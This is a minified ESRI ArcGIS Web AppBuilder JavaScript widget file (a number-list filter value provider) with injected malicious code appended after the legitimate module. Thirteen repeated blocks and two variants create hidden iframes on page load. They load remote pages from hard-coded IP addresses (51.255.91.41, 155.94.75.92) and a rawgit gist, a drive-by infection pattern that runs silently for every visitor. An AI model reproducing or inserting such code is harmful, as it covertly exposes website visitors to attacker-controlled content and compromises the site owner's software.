// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/_filter/NumberListValueProvider.html":'\x3cdiv\x3e\r\n    \x3ctable data-dojo-attach-point\x3d"numberListTable" style\x3d"width:100%;border-collapse:collapse;"\r\n        cellpadding\x3d"0" cellspacing\x3d"0"\x3e\r\n        \x3ctbody\x3e\r\n            \x3ctr\x3e\r\n                \x3ctd style\x3d"width:50%;"\x3e\r\n                    \x3cinput data-dojo-attach-point\x3d"_dijit1" data-dojo-type\x3d"dijit/form/NumberTextBox"\r\n                        data-dojo-props\x3d\'"required":false,constraints:{min:0,pattern:"#####0.##########"}\'\r\n                        style\x3d"width:100%;" /\x3e\r\n                \x3c/td\x3e\r\n                \x3ctd\x3e\r\n                    \x3cselect data-dojo-attach-point\x3d"rangeSelect" data-dojo-type\x3d"dijit/form/Select"\r\n                        style\x3d"width:100%;" class\x3d"operator-select dijit-form-Select restrict-select-width"\x3e\r\n                        \x3coption value\x3d"none"\x3e${nls.none}\x3c/option\x3e\r\n                    \x3c/select\x3e\r\n                \x3c/td\x3e\r\n            \x3c/tr\x3e\r\n        \x3c/tbody\x3e\r\n    \x3c/table\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/lang dojo/_base/html dojo/_base/array dojo/_base/declare ./ValueProvider dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./NumberListValueProvider.html dijit/form/NumberTextBox dijit/form/Select".split(" "),function(b,c,d,e,f,g,h,k){return e([f,g,h],{templateString:k,postCreate:function(){this.inherited(arguments);c.addClass(this.domNode,"jimu-number-list-filter-value-provider");this.rangeSelect.removeOption(this.rangeSelect.getOptions());d.forEach("dateOperatorMinutes dateOperatorHours dateOperatorDays dateOperatorWeeks dateOperatorMonths dateOperatorYears".split(" "),
b.hitch(this,function(a){this.rangeSelect.addOption({value:a,label:this.nls[a]})}));this.rangeSelect.set("value","dateOperatorDays")},getDijits:function(){return[this._dijit1,this.rangeSelect]},setValueObject:function(a){this.isDefined(a.value)&&this._dijit1.set("value",a.value);this.isDefined(a.range)&&this.rangeSelect.set("value",a.range)},getValueObject:function(){return this.isValidValue()?{isValid:!0,type:this.partObj.valueObj.type,value:parseFloat(this._dijit1.get("value")),range:this._getRangeByUI()}:
null},_getRangeByUI:function(){var a=this.rangeSelect.get("value");"none"===a&&(a=null);return a},tryGetValueObject:function(){if(this.isValidValue())return this.getValueObject();if(this.isEmptyValue()){var a={isValid:!0,type:this.partObj.valueObj.type,value:parseFloat(this._dijit1.get("value")),range:this._getRangeByUI()};isNaN(a.value)&&(a.value=null);return a}return null},setRequired:function(a){this._dijit1.set("required",a);this.rangeSelect.set("required",a)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});